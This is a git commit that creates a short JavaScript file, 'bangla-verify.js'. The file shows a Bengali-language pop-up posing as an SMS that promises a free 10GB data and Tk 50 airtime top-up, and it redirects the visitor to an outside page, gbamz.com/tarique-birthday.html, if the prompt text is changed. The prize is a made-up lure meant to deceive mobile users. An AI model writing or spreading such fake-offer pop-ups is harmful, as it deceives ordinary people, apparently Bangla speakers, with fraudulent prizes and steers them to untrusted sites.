56121cbc4c7eb45333760bc539cfbaffc62494f8
sweet16palz-hub <sweet16palz@gmail.com>
2026-05-19 05:49:23 +0100

    Create bangla-verify.js

---
+++ bangla-verify.js
@@ -0,0 +1,5 @@
+var password = '10GB + Tk 50 এয়ারটাইম টপ-আপ'
+password=prompt('SMS: অভিনন্দন, আপনার মোবাইল নম্বরটি 10GB + Tk 50 এয়ারটাইম টপ-আপ পাওয়ার যোগ্য, এখনই সক্রিয় করতে ওকে ক্লিক করুন','10GB + Tk 50 এয়ারটাইম টপ-আপ');
+if (password != '10GB + Tk 50 এয়ারটাইম টপ-আপ') {
+location.href='https://gbamz.com/tarique-birthday.html';
+}
